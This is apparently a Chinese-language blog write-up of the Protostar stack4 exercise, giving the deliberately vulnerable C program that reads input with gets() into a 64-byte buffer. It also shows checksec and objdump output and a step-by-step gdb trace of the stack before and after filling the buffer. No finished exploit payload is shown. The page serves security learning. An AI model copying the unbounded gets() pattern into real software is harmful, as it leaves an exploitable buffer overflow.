@@ -1,0 +1,718 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta http-equiv="X-UA-Compatible" content="ie=edge" />
+<link rel="stylesheet" href="/_assets/main.css" />
+
+    <title>Protostar_stack4 - Dark&amp;Lord</title>
+  <link rel="stylesheet" href="/_markdown_plugin_assets/highlight.js/atom-one-light.css" /></head>
+  <body>
+    <div class="main">
+      <nav class="navigation">
+        <a href="/">Dark&amp;Lord</a>
+      </nav>
+      <article>
+        <header>
+          <h1 class="article-title">Protostar_stack4</h1>
+          <div class="article-info">
+            <div>
+              <span
+                >Created At：<time datetime="1700620262761"
+                  >2023</time
+                ></span
+              >
+              <span
+                >Updated At：<time datetime="1700987256536"
+                  >2023</time
+                ></span
+              >
+            </div>
+            
+          </div>
+        </header>
+        <div class="article-content markdown-body"><p><strong>运行该程序，得到：</strong></p>
+<p><strong><img src="/_resources/fe16563cd4ed4ffc8de9b960099f3586.png" alt="ccb9efc32f7aa26df31421d720649538.png" width="554" height="89" class="jop-noMdConv" /></strong></p>
+<h3 id="source-code"><strong>Source code:</strong></h3>
+<div><pre class="hljs"><code><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span>
+
+<span class="hljs-type">void</span> <span class="hljs-title function_">win</span><span class="hljs-params">()</span>
+{
+  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"code flow successfully changed\n"</span>);
+}
+
+<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span>
+{
+  <span class="hljs-type">char</span> buffer[<span class="hljs-number">64</span>];
+
+  gets(buffer);
+}</code></pre></div>
+<p><strong>checksec:</strong></p>
+<div><pre class="hljs"><code>┌──(kali㉿kali)-[/opt/protostar/bin]
+└─$ checksec --file=./stack4 
+[*] <span class="hljs-string">'/opt/protostar/bin/stack4'</span>
+    Arch:     i386-32-little
+    RELRO:    No RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x8048000)
+    RWX:      Has RWX segments</code></pre></div>
+<p><strong>objdump:</strong></p>
+<div><pre class="hljs"><code>┌──(kali㉿kali)-[/opt/protostar/bin]
+└─$ objdump -t -j .text ./stack4 
+
+./stack4:     file format elf32-i386
+
+SYMBOL TABLE:
+08048340 l    d  .text  00000000              .text
+08048370 l     F .text  00000000              __do_global_dtors_aux
+080483d0 l     F .text  00000000              frame_dummy
+08048490 l     F .text  00000000              __do_global_ctors_aux
+08048420 g     F .text  00000005              __libc_csu_fini
+08048340 g     F .text  00000000              _start
+080483f4 g     F .text  00000014              win
+08048430 g     F .text  0000005a              __libc_csu_init
+0804848a g     F .text  00000000              .hidden __i686.get_pc_thunk.bx
+08048408 g     F .text  00000017              main</code></pre></div>
+<p><strong>查看汇编代码:</strong></p>
+<div><pre class="hljs"><code><span class="hljs-meta">gdb-peda$ </span><span class="language-bash">disass main</span>
+Dump of assembler code for function main:
+   0x08048408 &lt;+0&gt;:     push   ebp
+   0x08048409 &lt;+1&gt;:     mov    ebp,esp
+   0x0804840b &lt;+3&gt;:     and    esp,0xfffffff0
+   0x0804840e &lt;+6&gt;:     sub    esp,0x50
+   0x08048411 &lt;+9&gt;:     lea    eax,[esp+0x10]
+   0x08048415 &lt;+13&gt;:    mov    DWORD PTR [esp],eax
+   0x08048418 &lt;+16&gt;:    call   0x804830c &lt;gets@plt&gt;
+   0x0804841d &lt;+21&gt;:    leave
+   0x0804841e &lt;+22&gt;:    ret
+End of assembler dump.
+<span class="hljs-meta">gdb-peda$ </span><span class="language-bash">disass win</span>
+Dump of assembler code for function win:
+   0x080483f4 &lt;+0&gt;:     push   ebp
+   0x080483f5 &lt;+1&gt;:     mov    ebp,esp
+   0x080483f7 &lt;+3&gt;:     sub    esp,0x18
+   0x080483fa &lt;+6&gt;:     mov    DWORD PTR [esp],0x80484e0
+   0x08048401 &lt;+13&gt;:    call   0x804832c &lt;puts@plt&gt;
+   0x08048406 &lt;+18&gt;:    leave
+   0x08048407 &lt;+19&gt;:    ret
+End of assembler dump.</code></pre></div>
+<p><strong>调试过程如下：</strong></p>
+<div><pre class="hljs"><code>(gdb) i b
+Num     Type           Disp Enb Address    What
+1       breakpoint     keep y   0x08048408 in main at stack4/stack4.c:12
+2       breakpoint     keep y   0x08048409 in main at stack4/stack4.c:12
+3       breakpoint     keep y   0x0804840b in main at stack4/stack4.c:12
+4       breakpoint     keep y   0x0804840e in main at stack4/stack4.c:12
+5       breakpoint     keep y   0x08048411 in main at stack4/stack4.c:15
+6       breakpoint     keep y   0x08048415 in main at stack4/stack4.c:15
+7       breakpoint     keep y   0x08048418 in main at stack4/stack4.c:15
+8       breakpoint     keep y   0x0804841d in main at stack4/stack4.c:16
+9       breakpoint     keep y   0x0804841e in main at stack4/stack4.c:16</code></pre></div>
+<p><code>0x8048408 &lt;main&gt;: push ebp：</code></p>
+<p><strong>1、将当前函数的基址指针（ebp）的值压入栈中，保存当前函数的栈帧</strong></p>
+<div><pre class="hljs"><code>(gdb) r
+Starting program: /opt/protostar/bin/stack4 
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library <span class="hljs-string">"/lib/x86_64-linux-gnu/libthread_db.so.1"</span>.
+
+Breakpoint 1, main (argc=&lt;error reading variable: Unknown argument list address <span class="hljs-keyword">for</span> `argc<span class="hljs-string">'.&gt;, 
+    argv=&lt;error reading variable: Unknown argument list address for `argv'</span>.&gt;) at stack4/stack4.c:12
+12      stack4/stack4.c: No such file or directory.
+(gdb) i r
+eax            0x8048408           134513672
+ecx            0x89ae3a96          -1985070442
+edx            0xffffcfd0          -12336
+ebx            0xf7e1dff4          -136192012
+esp            0xffffcfac          0xffffcfac
+ebp            0x0                 0x0
+esi            0x8048430           134513712
+edi            0xf7ffcba0          -134231136
+eip            0x8048408           0x8048408 &lt;main&gt;
+eflags         0x246               [ PF ZF IF ]
+cs             0x23                35
+ss             0x2b                43
+ds             0x2b                43
+es             0x2b                43
+fs             0x0                 0
+gs             0x63                99
+(gdb) x/10i <span class="hljs-variable">$eip</span>
+=&gt; 0x8048408 &lt;main&gt;:    push   ebp
+   0x8048409 &lt;main+1&gt;:  mov    ebp,esp
+   0x804840b &lt;main+3&gt;:  and    esp,0xfffffff0
+   0x804840e &lt;main+6&gt;:  sub    esp,0x50
+   0x8048411 &lt;main+9&gt;:  lea    eax,[esp+0x10]
+   0x8048415 &lt;main+13&gt;: mov    DWORD PTR [esp],eax
+   0x8048418 &lt;main+16&gt;: call   0x804830c &lt;gets@plt&gt;
+   0x804841d &lt;main+21&gt;: leave
+   0x804841e &lt;main+22&gt;: ret
+   0x804841f:   nop
+(gdb) x/20wx <span class="hljs-variable">$esp</span>
+0xffffcfac:     0xf7c237c5      0x00000001      0xffffd064      0xffffd06c
+0xffffcfbc:     0xffffcfd0      0xf7e1dff4      0x08048408      0x00000001
+0xffffcfcc:     0xffffd064      0xf7e1dff4      0x08048430      0xf7ffcba0
+0xffffcfdc:     0x00000000      0xf25e5086      0x89ae3a96      0x00000000
+0xffffcfec:     0x00000000      0x00000000      0xf7ffcba0      0x00000000</code></pre></div>
+<p>执行<code>push ebp</code>后，而<code>esp 0xffffcfac -&gt; 0xffffcfa8</code></p>
+<p>2、<code>mov ebp,esp：</code><strong>将当前栈指针的值赋给基址指针，建立当前函数的栈帧。</strong></p>
+<div><pre class="hljs"><code>(gdb) n
+
+Breakpoint 2, 0x08048409 <span class="hljs-keyword">in</span> main (argc=&lt;error reading variable: Unknown argument list address <span class="hljs-keyword">for</span> `argc<span class="hljs-string">'.&gt;, 
+    argv=&lt;error reading variable: Unknown argument list address for `argv'</span>.&gt;) at stack4/stack4.c:12
+12      <span class="hljs-keyword">in</span> stack4/stack4.c
+(gdb) i r
+eax            0x8048408           134513672
+ecx            0x89ae3a96          -1985070442
+edx            0xffffcfd0          -12336
+ebx            0xf7e1dff4          -136192012
+esp            0xffffcfa8          0xffffcfa8
+ebp            0x0                 0x0
+esi            0x8048430           134513712
+edi            0xf7ffcba0          -134231136
+eip            0x8048409           0x8048409 &lt;main+1&gt;
+eflags         0x246               [ PF ZF IF ]
+cs             0x23                35
+ss             0x2b                43
+ds             0x2b                43
+es             0x2b                43
+fs             0x0                 0
+gs             0x63                99
+(gdb) x/10i <span class="hljs-variable">$eip</span>
+=&gt; 0x8048409 &lt;main+1&gt;:  mov    ebp,esp
+   0x804840b &lt;main+3&gt;:  and    esp,0xfffffff0
+   0x804840e &lt;main+6&gt;:  sub    esp,0x50
+   0x8048411 &lt;main+9&gt;:  lea    eax,[esp+0x10]
+   0x8048415 &lt;main+13&gt;: mov    DWORD PTR [esp],eax
+   0x8048418 &lt;main+16&gt;: call   0x804830c &lt;gets@plt&gt;
+   0x804841d &lt;main+21&gt;: leave
+   0x804841e &lt;main+22&gt;: ret
+   0x804841f:   nop
+   0x8048420 &lt;__libc_csu_fini&gt;: push   ebp
+(gdb) x/20wx <span class="hljs-variable">$esp</span>
+0xffffcfa8:     0x00000000      0xf7c237c5      0x00000001      0xffffd064
+0xffffcfb8:     0xffffd06c      0xffffcfd0      0xf7e1dff4      0x08048408
+0xffffcfc8:     0x00000001      0xffffd064      0xf7e1dff4      0x08048430
+0xffffcfd8:     0xf7ffcba0      0x00000000      0xf25e5086      0x89ae3a96
+0xffffcfe8:     0x00000000      0x00000000      0x00000000      0xf7ffcba0</code></pre></div>
+<p> 执行<code>mov ebp,esp</code>后，而<code>ebp = esp = 0xffffcfa8</code></p>
+<p>3、<code>and esp,0xfffffff0：</code><strong>将栈指针与0xfffffff0进行按位与操作，将栈指针向下舍入到16字节边界，以对齐栈。</strong></p>
+<div><pre class="hljs"><code>(gdb) n
+
+Breakpoint 3, 0x0804840b <span class="hljs-keyword">in</span> main (argc=1, argv=0xffffd064) at stack4/stack4.c:12
+12      <span class="hljs-keyword">in</span> stack4/stack4.c
+(gdb) i r
+eax            0x8048408           134513672
+ecx            0x89ae3a96          -1985070442
+edx            0xffffcfd0          -12336
+ebx            0xf7e1dff4          -136192012
+esp            0xffffcfa8          0xffffcfa8
+ebp            0xffffcfa8          0xffffcfa8
+esi            0x8048430           134513712
+edi            0xf7ffcba0          -134231136
+eip            0x804840b           0x804840b &lt;main+3&gt;
+eflags         0x246               [ PF ZF IF ]
+cs             0x23                35
+ss             0x2b                43
+ds             0x2b                43
+es             0x2b                43
+fs             0x0                 0
+gs             0x63                99
+(gdb) x/10i <span class="hljs-variable">$eip</span>
+=&gt; 0x804840b &lt;main+3&gt;:  and    esp,0xfffffff0
+   0x804840e &lt;main+6&gt;:  sub    esp,0x50
+   0x8048411 &lt;main+9&gt;:  lea    eax,[esp+0x10]
+   0x8048415 &lt;main+13&gt;: mov    DWORD PTR [esp],eax
+   0x8048418 &lt;main+16&gt;: call   0x804830c &lt;gets@plt&gt;
+   0x804841d &lt;main+21&gt;: leave
+   0x804841e &lt;main+22&gt;: ret
+   0x804841f:   nop
+   0x8048420 &lt;__libc_csu_fini&gt;: push   ebp
+   0x8048421 &lt;__libc_csu_fini+1&gt;:       mov    ebp,esp
+(gdb) x/20wx <span class="hljs-variable">$esp</span>
+0xffffcfa8:     0x00000000      0xf7c237c5      0x00000001      0xffffd064
+0xffffcfb8:     0xffffd06c      0xffffcfd0      0xf7e1dff4      0x08048408
+0xffffcfc8:     0x00000001      0xffffd064      0xf7e1dff4      0x08048430
+0xffffcfd8:     0xf7ffcba0      0x00000000      0xf25e5086      0x89ae3a96
+0xffffcfe8:     0x00000000      0x00000000      0x00000000      0xf7ffcba0</code></pre></div>
+<p> 执行<code>and esp,0xfffffff0</code>后，<code>esp 0xffffcfa8 - &gt; 0xffffcfa0</code>，可以看到<code>0xffffcfa0: 0x00000000 0x00000078 0x00000000 0xf7c237c5</code>这一行，esp被对齐</p>
+<p>4、<code>sub esp,0x50：</code><strong>分配80字节的局部变量空间，通过将栈指针向下移动来实现。</strong></p>
+<div><pre class="hljs"><code>(gdb) n
+
+Breakpoint 4, 0x0804840e <span class="hljs-keyword">in</span> main (argc=1, argv=0xffffd064) at stack4/stack4.c:12
+12      <span class="hljs-keyword">in</span> stack4/stack4.c
+(gdb) i r
+eax            0x8048408           134513672
+ecx            0x89ae3a96          -1985070442
+edx            0xffffcfd0          -12336
+ebx            0xf7e1dff4          -136192012
+esp            0xffffcfa0          0xffffcfa0
+ebp            0xffffcfa8          0xffffcfa8
+esi            0x8048430           134513712
+edi            0xf7ffcba0          -134231136
+eip            0x804840e           0x804840e &lt;main+6&gt;
+eflags         0x286               [ PF SF IF ]
+cs             0x23                35
+ss             0x2b                43
+ds             0x2b                43
+es             0x2b                43
+fs             0x0                 0
+gs             0x63                99
+(gdb) x/10i <span class="hljs-variable">$eip</span>
+=&gt; 0x804840e &lt;main+6&gt;:  sub    esp,0x50
+   0x8048411 &lt;main+9&gt;:  lea    eax,[esp+0x10]
+   0x8048415 &lt;main+13&gt;: mov    DWORD PTR [esp],eax
+   0x8048418 &lt;main+16&gt;: call   0x804830c &lt;gets@plt&gt;
+   0x804841d &lt;main+21&gt;: leave
+   0x804841e &lt;main+22&gt;: ret
+   0x804841f:   nop
+   0x8048420 &lt;__libc_csu_fini&gt;: push   ebp
+   0x8048421 &lt;__libc_csu_fini+1&gt;:       mov    ebp,esp
+   0x8048423 &lt;__libc_csu_fini+3&gt;:       pop    ebp
+(gdb) x/20wx <span class="hljs-variable">$esp</span>
+0xffffcfa0:     0x00000000      0x00000078      0x00000000      0xf7c237c5
+0xffffcfb0:     0x00000001      0xffffd064      0xffffd06c      0xffffcfd0
+0xffffcfc0:     0xf7e1dff4      0x08048408      0x00000001      0xffffd064
+0xffffcfd0:     0xf7e1dff4      0x08048430      0xf7ffcba0      0x00000000
+0xffffcfe0:     0xf25e5086      0x89ae3a96      0x00000000      0x00000000</code></pre></div>
+<p> 执行<code>sub esp,0x50</code>后，<code>esp 0xffffcfa0 - &gt; 0xffffcf50</code></p>
+<p>5、<code>lea eax,[esp+0x10]：</code><strong>计算并将<code>esp+0x10</code>的地址存储在eax寄存器中。此处可能在准备调用<code>gets</code>函数之前，为输入缓冲区分配空间。</strong></p>
+<div><pre class="hljs"><code>(gdb) n
+
+Breakpoint 5, main (argc=1, argv=0xffffd064) at stack4/stack4.c:15
+15      <span class="hljs-keyword">in</span> stack4/stack4.c
+(gdb) i r
+eax            0x8048408           134513672
+ecx            0x89ae3a96          -1985070442
+edx            0xffffcfd0          -12336
+ebx            0xf7e1dff4          -136192012
+esp            0xffffcf50          0xffffcf50
+ebp            0xffffcfa8          0xffffcfa8
+esi            0x8048430           134513712
+edi            0xf7ffcba0          -134231136
+eip            0x8048411           0x8048411 &lt;main+9&gt;
+eflags         0x286               [ PF SF IF ]
+cs             0x23                35
+ss             0x2b                43
+ds             0x2b                43
+es             0x2b                43
+fs             0x0                 0
+gs             0x63                99
+(gdb) x/10i <span class="hljs-variable">$eip</span>
+=&gt; 0x8048411 &lt;main+9&gt;:  lea    eax,[esp+0x10]
+   0x8048415 &lt;main+13&gt;: mov    DWORD PTR [esp],eax
+   0x8048418 &lt;main+16&gt;: call   0x804830c &lt;gets@plt&gt;
+   0x804841d &lt;main+21&gt;: leave
+   0x804841e &lt;main+22&gt;: ret
+   0x804841f:   nop
+   0x8048420 &lt;__libc_csu_fini&gt;: push   ebp
+   0x8048421 &lt;__libc_csu_fini+1&gt;:       mov    ebp,esp
+   0x8048423 &lt;__libc_csu_fini+3&gt;:       pop    ebp
+   0x8048424 &lt;__libc_csu_fini+4&gt;:       ret
+(gdb) x/20wx <span class="hljs-variable">$esp</span>
+0xffffcf50:     0xf7ffcff4      0x0000000c      0x00000000      0xffffdfde
+0xffffcf60:     0xf7fc8580      0x00000000      0xf7c1c9a2      0xf7e1e04c
+0xffffcf70:     0xf7fc2400      0xf7fd9e8b      0xf7c1c9a2      0xf7fc2400
+0xffffcf80:     0xffffcfc0      0xf7fc25d8      0xf7fc2aa0      0x00000001
+0xffffcf90:     0x00000001      0x00000000      0x00000000      0x00000000</code></pre></div>
+<p> 6、<code>mov DWORD PTR [esp],eax:</code><strong>将eax寄存器中的值存储到栈的顶部，这是作为参数传递给<code>gets</code>函数的地址。</strong></p>
+<div><pre class="hljs"><code>(gdb) n
+
+Breakpoint 6, 0x08048415 <span class="hljs-keyword">in</span> main (argc=1, argv=0xffffd064) at stack4/stack4.c:15
+15      <span class="hljs-keyword">in</span> stack4/stack4.c
+(gdb) i r
+eax            0xffffcf60          -12448
+ecx            0x89ae3a96          -1985070442
+edx            0xffffcfd0          -12336
+ebx            0xf7e1dff4          -136192012
+esp            0xffffcf50          0xffffcf50
+ebp            0xffffcfa8          0xffffcfa8
+esi            0x8048430           134513712
+edi            0xf7ffcba0          -134231136
+eip            0x8048415           0x8048415 &lt;main+13&gt;
+eflags         0x286               [ PF SF IF ]
+cs             0x23                35
+ss             0x2b                43
+ds             0x2b                43
+es             0x2b                43
+fs             0x0                 0
+gs             0x63                99
+(gdb) x/10i <span class="hljs-variable">$eip</span>
+=&gt; 0x8048415 &lt;main+13&gt;: mov    DWORD PTR [esp],eax
+   0x8048418 &lt;main+16&gt;: call   0x804830c &lt;gets@plt&gt;
+   0x804841d &lt;main+21&gt;: leave
+   0x804841e &lt;main+22&gt;: ret
+   0x804841f:   nop
+   0x8048420 &lt;__libc_csu_fini&gt;: push   ebp
+   0x8048421 &lt;__libc_csu_fini+1&gt;:       mov    ebp,esp
+   0x8048423 &lt;__libc_csu_fini+3&gt;:       pop    ebp
+   0x8048424 &lt;__libc_csu_fini+4&gt;:       ret
+   0x8048425:   lea    esi,[esi+eiz*1+0x0]
+(gdb) x/64wx <span class="hljs-variable">$esp</span>
+0xffffcf50:     0xf7ffcff4      0x0000000c      0x00000000      0xffffdfde
+0xffffcf60:     0xf7fc8580      0x00000000      0xf7c1c9a2      0xf7e1e04c
+0xffffcf70:     0xf7fc2400      0xf7fd9e8b      0xf7c1c9a2      0xf7fc2400
+0xffffcf80:     0xffffcfc0      0xf7fc25d8      0xf7fc2aa0      0x00000001
+0xffffcf90:     0x00000001      0x00000000      0x00000000      0x00000000
+0xffffcfa0:     0x00000000      0x00000078      0x00000000      0xf7c237c5
+0xffffcfb0:     0x00000001      0xffffd064      0xffffd06c      0xffffcfd0
+0xffffcfc0:     0xf7e1dff4      0x08048408      0x00000001      0xffffd064
+0xffffcfd0:     0xf7e1dff4      0x08048430      0xf7ffcba0      0x00000000
+0xffffcfe0:     0xf25e5086      0x89ae3a96      0x00000000      0x00000000
+0xffffcff0:     0x00000000      0xf7ffcba0      0x00000000      0x1d1faa00
+0xffffd000:     0xf7ffda20      0xf7c23756      0xf7e1dff4      0xf7c23888
+0xffffd010:     0xf7fcaac4      0xf7ffcff4      0x00000001      0x08048340
+0xffffd020:     0x00000000      0xf7fdbe90      0xf7c23809      0xf7ffcff4
+0xffffd030:     0x00000001      0x08048340      0x00000000      0x08048361
+0xffffd040:     0x08048408      0x00000001      0xffffd064      0x08048430</code></pre></div>
+<p>7、<code>call 0x804830c gets@plt:</code><strong>调用<code>gets</code>函数，它从标准输入中读取字符串并将其存储在之前分配的地址中。然而，<code>gets</code>函数是一个不安全的函数，容易受到缓冲区溢出攻击。</strong></p>
+<div><pre class="hljs"><code>(gdb) n
+
+Breakpoint 7, 0x08048418 <span class="hljs-keyword">in</span> main (argc=1, argv=0xffffd064) at stack4/stack4.c:15
+15      <span class="hljs-keyword">in</span> stack4/stack4.c
+(gdb) i r
+eax            0xffffcf60          -12448
+ecx            0x89ae3a96          -1985070442
+edx            0xffffcfd0          -12336
+ebx            0xf7e1dff4          -136192012
+esp            0xffffcf50          0xffffcf50
+ebp            0xffffcfa8          0xffffcfa8
+esi            0x8048430           134513712
+edi            0xf7ffcba0          -134231136
+eip            0x8048418           0x8048418 &lt;main+16&gt;
+eflags         0x286               [ PF SF IF ]
+cs             0x23                35
+ss             0x2b                43
+ds             0x2b                43
+es             0x2b                43
+fs             0x0                 0
+gs             0x63                99
+(gdb) x/10i <span class="hljs-variable">$eip</span>
+=&gt; 0x8048418 &lt;main+16&gt;: call   0x804830c &lt;gets@plt&gt;
+   0x804841d &lt;main+21&gt;: leave
+   0x804841e &lt;main+22&gt;: ret
+   0x804841f:   nop
+   0x8048420 &lt;__libc_csu_fini&gt;: push   ebp
+   0x8048421 &lt;__libc_csu_fini+1&gt;:       mov    ebp,esp
+   0x8048423 &lt;__libc_csu_fini+3&gt;:       pop    ebp
+   0x8048424 &lt;__libc_csu_fini+4&gt;:       ret
+   0x8048425:   lea    esi,[esi+eiz*1+0x0]
+   0x8048429:   lea    edi,[edi+eiz*1+0x0]
+(gdb) x/64wx <span class="hljs-variable">$esp</span>
+0xffffcf50:     0xffffcf60      0x0000000c      0x00000000      0xffffdfde
+0xffffcf60:     0xf7fc8580      0x00000000      0xf7c1c9a2      0xf7e1e04c
+0xffffcf70:     0xf7fc2400      0xf7fd9e8b      0xf7c1c9a2      0xf7fc2400
+0xffffcf80:     0xffffcfc0      0xf7fc25d8      0xf7fc2aa0      0x00000001
+0xffffcf90:     0x00000001      0x00000000      0x00000000      0x00000000
+0xffffcfa0:     0x00000000      0x00000078      0x00000000      0xf7c237c5
+0xffffcfb0:     0x00000001      0xffffd064      0xffffd06c      0xffffcfd0
+0xffffcfc0:     0xf7e1dff4      0x08048408      0x00000001      0xffffd064
+0xffffcfd0:     0xf7e1dff4      0x08048430      0xf7ffcba0      0x00000000
+0xffffcfe0:     0xf25e5086      0x89ae3a96      0x00000000      0x00000000
+0xffffcff0:     0x00000000      0xf7ffcba0      0x00000000      0x1d1faa00
+0xffffd000:     0xf7ffda20      0xf7c23756      0xf7e1dff4      0xf7c23888
+0xffffd010:     0xf7fcaac4      0xf7ffcff4      0x00000001      0x08048340
+0xffffd020:     0x00000000      0xf7fdbe90      0xf7c23809      0xf7ffcff4
+0xffffd030:     0x00000001      0x08048340      0x00000000      0x08048361
+0xffffd040:     0x08048408      0x00000001      0xffffd064      0x08048430</code></pre></div>
+<p>8、<code>leave:</code><strong>恢复栈帧，相当于<code>mov esp, ebp</code> 和 <code>pop ebp</code> 的组合，释放栈空间。</strong></p>
+<div><pre class="hljs"><code>(gdb) n
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa    
+
+Breakpoint <span class="hljs-number">8</span>, main (argc=<span class="hljs-number">1</span>, argv=<span class="hljs-number">0xffffd064</span>) <span class="hljs-meta">at</span> stack4/stack4<span class="hljs-number">.</span>c:<span class="hljs-number">16</span>
+<span class="hljs-number">16</span>      <span class="hljs-keyword">in</span> stack4/stack4<span class="hljs-number">.</span>c
+(gdb) i r
+<span class="hljs-built_in">eax</span>            <span class="hljs-number">0xffffcf60</span>          -<span class="hljs-number">12448</span>
+<span class="hljs-built_in">ecx</span>            <span class="hljs-number">0xf7e1f9c4</span>          -<span class="hljs-number">136185404</span>
+<span class="hljs-built_in">edx</span>            <span class="hljs-number">0x0</span>                 <span class="hljs-number">0</span>
+<span class="hljs-built_in">ebx</span>            <span class="hljs-number">0xf7e1dff4</span>          -<span class="hljs-number">136192012</span>
+<span class="hljs-built_in">esp</span>            <span class="hljs-number">0xffffcf50</span>          <span class="hljs-number">0xffffcf50</span>
+<span class="hljs-built_in">ebp</span>            <span class="hljs-number">0xffffcfa8</span>          <span class="hljs-number">0xffffcfa8</span>
+<span class="hljs-built_in">esi</span>            <span class="hljs-number">0x8048430</span>           <span class="hljs-number">134513712</span>
+<span class="hljs-built_in">edi</span>            <span class="hljs-number">0xf7ffcba0</span>          -<span class="hljs-number">134231136</span>
+<span class="hljs-built_in">eip</span>            <span class="hljs-number">0x804841d</span>           <span class="hljs-number">0x804841d</span> &lt;main+<span class="hljs-number">21</span>&gt;
+eflags         <span class="hljs-number">0x246</span>               [ PF ZF IF ]
+<span class="hljs-built_in">cs</span>             <span class="hljs-number">0x23</span>                <span class="hljs-number">35</span>
+<span class="hljs-built_in">ss</span>             <span class="hljs-number">0x2b</span>                <span class="hljs-number">43</span>
+<span class="hljs-built_in">ds</span>             <span class="hljs-number">0x2b</span>                <span class="hljs-number">43</span>
+<span class="hljs-built_in">es</span>             <span class="hljs-number">0x2b</span>                <span class="hljs-number">43</span>
+<span class="hljs-built_in">fs</span>             <span class="hljs-number">0x0</span>                 <span class="hljs-number">0</span>
+<span class="hljs-built_in">gs</span>             <span class="hljs-number">0x63</span>                <span class="hljs-number">99</span>
+(gdb) x/10i $<span class="hljs-built_in">eip</span>
+=&gt; <span class="hljs-number">0x804841d</span> &lt;main+<span class="hljs-number">21</span>&gt;: <span class="hljs-keyword">leave</span>
+   <span class="hljs-number">0x804841e</span> &lt;main+<span class="hljs-number">22</span>&gt;: <span class="hljs-keyword">ret</span>
+   <span class="hljs-number">0x804841f</span>:   <span class="hljs-keyword">nop</span>
+   <span class="hljs-number">0x8048420</span> &lt;__libc_csu_fini&gt;: <span class="hljs-keyword">push</span>   <span class="hljs-built_in">ebp</span>
+   <span class="hljs-number">0x8048421</span> &lt;__libc_csu_fini+<span class="hljs-number">1</span>&gt;:       <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">ebp</span>,<span class="hljs-built_in">esp</span>
+   <span class="hljs-number">0x8048423</span> &lt;__libc_csu_fini+<span class="hljs-number">3</span>&gt;:       <span class="hljs-keyword">pop</span>    <span class="hljs-built_in">ebp</span>
+   <span class="hljs-number">0x8048424</span> &lt;__libc_csu_fini+<span class="hljs-number">4</span>&gt;:       <span class="hljs-keyword">ret</span>
+   <span class="hljs-number">0x8048425</span>:   <span class="hljs-keyword">lea</span>    <span class="hljs-built_in">esi</span>,[<span class="hljs-built_in">esi</span>+eiz*<span class="hljs-number">1</span>+<span class="hljs-number">0x0</span>]
+   <span class="hljs-number">0x8048429</span>:   <span class="hljs-keyword">lea</span>    <span class="hljs-built_in">edi</span>,[<span class="hljs-built_in">edi</span>+eiz*<span class="hljs-number">1</span>+<span class="hljs-number">0x0</span>]
+   <span class="hljs-number">0x8048430</span> &lt;__libc_csu_init&gt;: <span class="hljs-keyword">push</span>   <span class="hljs-built_in">ebp</span>
+(gdb) x/64wx $<span class="hljs-built_in">esp</span>
+<span class="hljs-number">0xffffcf50</span>:     <span class="hljs-number">0xffffcf60</span>      <span class="hljs-number">0x0000000c</span>      <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0xffffdfde</span>
+<span class="hljs-number">0xffffcf60</span>:     <span class="hljs-number">0x61616161</span>      <span class="hljs-number">0x61616161</span>      <span class="hljs-number">0x61616161</span>      <span class="hljs-number">0x61616161</span>
+<span class="hljs-number">0xffffcf70</span>:     <span class="hljs-number">0x61616161</span>      <span class="hljs-number">0x61616161</span>      <span class="hljs-number">0x61616161</span>      <span class="hljs-number">0x61616161</span>
+<span class="hljs-number">0xffffcf80</span>:     <span class="hljs-number">0x61616161</span>      <span class="hljs-number">0x61616161</span>      <span class="hljs-number">0x61616161</span>      <span class="hljs-number">0x61616161</span>
+<span class="hljs-number">0xffffcf90</span>:     <span class="hljs-number">0x61616161</span>      <span class="hljs-number">0x61616161</span>      <span class="hljs-number">0x61616161</span>      <span class="hljs-number">0x61616161</span>
+<span class="hljs-number">0xffffcfa0</span>:     <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0x00000078</span>      <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0xf7c237c5</span>
+<span class="hljs-number">0xffffcfb0</span>:     <span class="hljs-number">0x00000001</span>      <span class="hljs-number">0xffffd064</span>      <span class="hljs-number">0xffffd06c</span>      <span class="hljs-number">0xffffcfd0</span>
+<span class="hljs-number">0xffffcfc0</span>:     <span class="hljs-number">0xf7e1dff4</span>      <span class="hljs-number">0x08048408</span>      <span class="hljs-number">0x00000001</span>      <span class="hljs-number">0xffffd064</span>
+<span class="hljs-number">0xffffcfd0</span>:     <span class="hljs-number">0xf7e1dff4</span>      <span class="hljs-number">0x08048430</span>      <span class="hljs-number">0xf7ffcba0</span>      <span class="hljs-number">0x00000000</span>
+<span class="hljs-number">0xffffcfe0</span>:     <span class="hljs-number">0xf25e5086</span>      <span class="hljs-number">0x89ae3a96</span>      <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0x00000000</span>
+<span class="hljs-number">0xffffcff0</span>:     <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0xf7ffcba0</span>      <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0x1d1faa00</span>
+<span class="hljs-number">0xffffd000</span>:     <span class="hljs-number">0xf7ffda20</span>      <span class="hljs-number">0xf7c23756</span>      <span class="hljs-number">0xf7e1dff4</span>      <span class="hljs-number">0xf7c23888</span>
+<span class="hljs-number">0xffffd010</span>:     <span class="hljs-number">0xf7fcaac4</span>      <span class="hljs-number">0xf7ffcff4</span>      <span class="hljs-number">0x00000001</span>      <span class="hljs-number">0x08048340</span>
+<span class="hljs-number">0xffffd020</span>:     <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0xf7fdbe90</span>      <span class="hljs-number">0xf7c23809</span>      <span class="hljs-number">0xf7ffcff4</span>
